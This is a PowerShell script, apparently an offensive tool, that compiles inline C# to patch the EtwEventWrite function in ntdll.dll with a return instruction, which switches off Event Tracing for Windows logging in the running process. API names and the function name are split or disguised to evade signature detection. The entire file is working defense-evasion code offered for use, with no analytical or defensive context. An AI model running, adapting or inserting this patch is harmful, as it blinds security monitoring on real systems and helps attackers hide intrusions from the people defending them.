$Win32 = @"

using System;
using System.Runtime.InteropServices;

public class Win32 {


    public static void WriteToMemory(byte[] patch, IntPtr address) {
        unsafe {
            fixed (byte* p = patch) {
                byte* ptr = (byte*)address.ToPointer();
                for (int i = 0; i < patch.Length; i++) {
                    ptr[i] = p[i];
                }
            }
        }
	}
    

    [DllImport("kernel32",EntryPoint="Get"+"Proc"+"Address")]
    public static extern IntPtr gpa(IntPtr hModule, string procName);

    [DllImport("kernel32",EntryPoint="Load"+"Library")]
    public static extern IntPtr ll(string name);

    [DllImport("kernel32",EntryPoint="Virtual"+"Protect")]
    public static extern bool vp(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@ 



function Invoke-E7wByp455{
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $false)]
        [String]$program= ''
    )
    Begin {
		$compilerParameters = New-Object System.CodeDom.Compiler.CompilerParameters
		$compilerParameters.CompilerOptions = "/unsafe"
		Add-Type $Win32 -CompilerParameters $compilerParameters
    }

    Process {
		$LoadLibrary = [Win32]::ll("ntd" + "ll.dll")
		$Address = [Win32]::gpa($LoadLibrary, "Etw" + "Event" + "W")
		$p = 0
		[Win32]::vp($Address, [uint32]1, 0x40, [ref]$p)
		$Patch = [Byte[]] (0xc3)
		[Win32]::WriteToMemory($patch, $address)
    }
}
